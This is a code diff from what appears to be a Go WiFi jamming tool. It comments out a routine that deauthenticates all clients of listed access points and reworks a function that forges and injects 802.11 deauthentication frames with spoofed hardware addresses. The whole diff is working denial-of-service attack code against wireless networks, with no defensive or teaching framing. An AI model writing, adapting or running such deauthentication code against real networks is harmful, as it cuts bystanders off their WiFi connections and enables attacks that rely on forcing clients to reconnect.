@@ -300,23 +300,23 @@ func (conn *JamConn) ChangeChanIfPast(timeout time.Duration) {
 	}
 }
 
-func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, apList *List) error {
+//func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, apList *List) error {
+//
+//	if time.Since(conn.lastDeauth) > timeout {
+//		for _, v := range apList.contents {
+//			ap := v.(Ap)
+//			for _, cli := range ap.Clients {
+//				if err := conn.Deauth(&cli, &ap); err != nil {
+//					return errors.New("JamConn.Deauth() " + err.Error())
+//				}
+//			}
+//		}
+//		conn.lastDeauth = time.Now()
+//	}
+//	return nil
+//}
 
-	if time.Since(conn.lastDeauth) > timeout {
-		for _, v := range apList.contents {
-			ap := v.(Ap)
-			for _, cli := range ap.Clients {
-				if err := conn.Deauth(&cli, &ap); err != nil {
-					return errors.New("JamConn.Deauth() " + err.Error())
-				}
-			}
-		}
-		conn.lastDeauth = time.Now()
-	}
-	return nil
-}
-
-func (conn *JamConn) Deauth(client *Client, ap *Ap) error {
+func (conn *JamConn) Deauth(client net.HardwareAddr, ap net.HardwareAddr, tap *layers.RadioTap, dot11Orig *layers.Dot11) error {
 
 	var buff gopacket.SerializeBuffer
 	var opts gopacket.SerializeOptions
@@ -328,23 +328,23 @@ func (conn *JamConn) Deauth(client *Client, ap *Ap) error {
 		Type: layers.Dot11TypeMgmtDeauthentication,
 		Proto: 0,
 		Flags: layers.Dot11Flags(0),
-		DurationID: client.dot11Hdr.DurationID,
+		DurationID: dot11Orig.DurationID,
 		//dst
-		Address1: client.hwaddr,
+		Address1: ap,
 		//src
-		Address2: ap.hwaddr,
+		Address2: client,
 		//bssid
-		Address3: ap.hwaddr,
+		Address3: ap,
 		//
-		Address4: ap.hwaddr,
-		SequenceNumber: client.dot11Hdr.SequenceNumber + 1,
+		Address4: client,
+		SequenceNumber: dot11Orig.SequenceNumber + 1,
 		FragmentNumber: 0,
 	}
 	mgmt := layers.Dot11MgmtDeauthentication {
 		Reason: layers.Dot11ReasonDeauthStLeaving,
 	}
 	if err := gopacket.SerializeLayers(buff, opts,
-		&ap.radioTapHdr,
+		tap,
 		&dot11,
 		&mgmt,
 	); err != nil {
@@ -353,7 +353,7 @@ func (conn *JamConn) Deauth(client *Client, ap *Ap) error {
 	if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
 		return errors.New("Handle.WritePacketData() " + err.Error())
 	}
-	fmt.Printf("deauthing for ap %s - %s\n", ap.SSID, ap.hwaddr.String())
+	fmt.Printf("deauthing client %s - from %s\n", client.String(), ap.String())
 	return nil
 }
 
